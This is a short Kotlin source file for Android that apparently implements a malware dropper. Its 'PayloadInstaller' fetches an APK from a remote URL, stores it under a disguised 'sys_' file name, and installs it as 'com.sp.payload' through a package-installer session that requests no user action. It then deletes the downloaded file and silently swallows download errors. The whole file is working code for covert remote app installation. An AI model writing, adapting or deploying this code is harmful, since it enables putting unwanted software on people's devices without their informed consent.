package com.sp.installer

import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.content.pm.PackageInstaller
import android.os.Build
import okhttp3.*
import java.io.File

object PayloadInstaller {
    fun installFromUrl(ctx: Context, url: String, apiKey: String) {
        val apk = File(ctx.cacheDir, "sys_${System.nanoTime()}.apk")
        val client = OkHttpClient()
        val req = Request.Builder().url(url).header("X-Key", apiKey).build()
        client.newCall(req).enqueue(object : Callback {
            override fun onFailure(call: Call, e: java.io.IOException) {}
            override fun onResponse(call: Call, response: Response) {
                response.body?.use { body ->
                    apk.outputStream().use { body.byteStream().copyTo(it) }
                    installSession(ctx, apk)
                }
            }
        })
    }

    private fun installSession(ctx: Context, apk: File) {
        val pi = ctx.packageManager.packageInstaller
        val params = PackageInstaller.SessionParams(
            PackageInstaller.SessionParams.MODE_FULL_INSTALL).apply {
            setAppPackageName("com.sp.payload")
            if (Build.VERSION.SDK_INT >= 31) {
                setRequireUserAction(
                    PackageInstaller.SessionParams.USER_ACTION_NOT_REQUIRED)
            }
        }
        val sid = pi.createSession(params)
        pi.openSession(sid).use { s ->
            s.openWrite("base.apk", 0, apk.length()).use { out ->
                apk.inputStream().use { it.copyTo(out) }
            }
            val cb = Intent(ctx, InstallReceiver::class.java).apply {
                action = "com.sp.INSTALL_DONE"
            }
            val pi2 = PendingIntent.getBroadcast(ctx, sid, cb,
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_MUTABLE)
            s.commit(pi2.intentSender)
        }
        apk.delete()
    }
}